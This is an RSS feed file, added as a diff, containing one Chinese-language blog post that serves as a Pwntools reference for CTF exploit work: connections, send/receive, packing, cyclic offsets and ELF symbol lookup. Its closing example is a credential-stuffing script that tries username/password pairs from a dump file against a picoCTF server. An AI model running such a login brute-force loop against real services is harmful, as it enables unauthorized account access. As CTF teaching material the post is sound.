@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Python on zhi旅程</title>
+    <link>http://localhost:1313/tags/python/</link>
+    <description>Recent content from zhi旅程</description>
+    <generator>Hugo</generator>
+    <language>zh-tw</language>
+    
+    <managingEditor>ray784523@zhienw.com (Zhi Chen)</managingEditor>
+    <webMaster>ray784523@zhienw.com (Zhi Chen)</webMaster>
+    
+    <copyright>本部落格所有文章除特別聲明外，均採用 BY-NC-SA 授權協議。轉載請註明出處！</copyright>
+    
+    <lastBuildDate>Tue, 28 Apr 2026 11:40:52 +0800</lastBuildDate>
+    
+    
+    <atom:link href="http://localhost:1313/tags/python/index.xml" rel="self" type="application/rss&#43;xml" />
+    
+
+    
+    
+
+    <item>
+      <title>Pwntools</title>
+      <link>http://localhost:1313/post/pwn-tools/</link>
+      <pubDate>Tue, 28 Apr 2026 11:30:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/pwn-tools/</guid>
+      <description>
+        <![CDATA[<h1>Pwntools</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="what-is-pwntools">
+<a class="header-anchor" href="#what-is-pwntools"></a>
+What is pwntools?
+</h2><p>Pwntools（pwn-tools） 是一個用 Python 撰寫的資安工具框架，主要用於漏洞利用開發與 CTF。
+主要用途包括：</p>
+<ol>
+<li>連線到遠端服務（remote）</li>
+<li>執行本地漏洞程式（process）</li>
+<li>傳送與接收資料（send / recv）</li>
+<li>建構 exploit payload（如 buffer overflow）</li>
+<li>分析 ELF 檔案與 libc</li>
+<li>自動化攻擊流程（bruteforce、exploit）</li>
+</ol>
+<h3 id="連線方式">
+<a class="header-anchor" href="#%e9%80%a3%e7%b7%9a%e6%96%b9%e5%bc%8f"></a>
+連線方式
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="c1"># 本地執行</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./binary&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 遠端連線</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用 GDB 附加</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;./binary&#39;</span><span class="p">,</span> <span class="s1">&#39;break main&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SSH</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.com&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;pass&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./binary&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="發送--接收資料">
+<a class="header-anchor" href="#%e7%99%bc%e9%80%81--%e6%8e%a5%e6%94%b6%e8%b3%87%e6%96%99"></a>
+發送 / 接收資料
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="c1"># 發送</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;data&#39;</span><span class="p">)</span>           <span class="c1"># 發送原始資料</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;data&#39;</span><span class="p">)</span>       <span class="c1"># 發送 + 換行 \n</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;data&#39;</span><span class="p">)</span>     <span class="c1"># 收到 &#39;:&#39; 後發送</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;data&#39;</span><span class="p">)</span> <span class="c1"># 收到 &#39;:&#39; 後發送 + 換行</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 接收</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>          <span class="c1"># 接收 n bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>       <span class="c1"># 接收一行</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>        <span class="c1"># 接收全部</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>  <span class="c1"># 接收直到特定字串</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>          <span class="c1"># 清空緩衝區</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>    <span class="c1"># 進入互動模式(取得shell開啟互動)</span>
+</span></span></code></pre></div><h3 id="資料打包--解包">
+<a class="header-anchor" href="#%e8%b3%87%e6%96%99%e6%89%93%e5%8c%85--%e8%a7%a3%e5%8c%85"></a>
+資料打包 / 解包
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="c1"># 打包（整數 → bytes）</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>     <span class="c1"># 32-bit little-endian</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>     <span class="c1"># 64-bit little-endian</span>
+</span></span><span class="line"><span class="cl"><span class="n">p16</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">)</span>         <span class="c1"># 16-bit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解包（bytes → 整數）</span>
+</span></span><span class="line"><span class="cl"><span class="n">u32</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 大端序</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="字串處理">
+<a class="header-anchor" href="#%e5%ad%97%e4%b8%b2%e8%99%95%e7%90%86"></a>
+字串處理
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="c1"># 產生循環字串（用於找 offset）</span>
+</span></span><span class="line"><span class="cl"><span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>               <span class="c1"># 產生 100 bytes 的循環字串</span>
+</span></span><span class="line"><span class="cl"><span class="n">cyclic_find</span><span class="p">(</span><span class="mh">0x6161616c</span><span class="p">)</span>   <span class="c1"># 找出 offset</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 十六進位轉換</span>
+</span></span><span class="line"><span class="cl"><span class="nb">hex</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">unhex</span><span class="p">(</span><span class="s1">&#39;deadbeef&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 編碼</span>
+</span></span><span class="line"><span class="cl"><span class="n">b64e</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>    <span class="c1"># Base64 encode</span>
+</span></span><span class="line"><span class="cl"><span class="n">b64d</span><span class="p">(</span><span class="s1">&#39;aGVsbG8=&#39;</span><span class="p">)</span> <span class="c1"># Base64 decode</span>
+</span></span></code></pre></div><h3 id="elf-分析">
+<a class="header-anchor" href="#elf-%e5%88%86%e6%9e%90"></a>
+ELF 分析
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./binary&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 取得函數/符號位址</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">functions</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 取得 GOT / PLT</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 基址（PIE 時用）</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0x400000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 搜尋字串</span>
+</span></span><span class="line"><span class="cl"><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
+</span></span></code></pre></div><h3 id="範例">
+<a class="header-anchor" href="#%e7%af%84%e4%be%8b"></a>
+範例
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#將檔案中帳號密碼分開存入串列</span>
+</span></span><span class="line"><span class="cl"><span class="n">user</span><span class="o">=</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwd</span><span class="o">=</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;creds-dump.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">parts</span><span class="o">=</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">passwd</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Total credentials: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;===========start==================&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#利用pwn模組自動嘗試帳密登入</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;==========</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">==================&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;crystal-peak.picoctf.net&#34;</span><span class="p">,</span> <span class="mi">64817</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Username: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">((</span><span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Password: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">((</span><span class="n">passwd</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span><span class="s1">&#39;Invalid username or password&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;username: &#39;</span><span class="o">+</span><span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;password: &#39;</span><span class="o">+</span><span class="n">passwd</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div>
+        
+        <hr><p>本文2026-04-28首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-04-28</p>]]>
+      </description>
+      
+        <category>Web tools</category>
+      
+    </item>
+    
+  </channel>
+</rss>
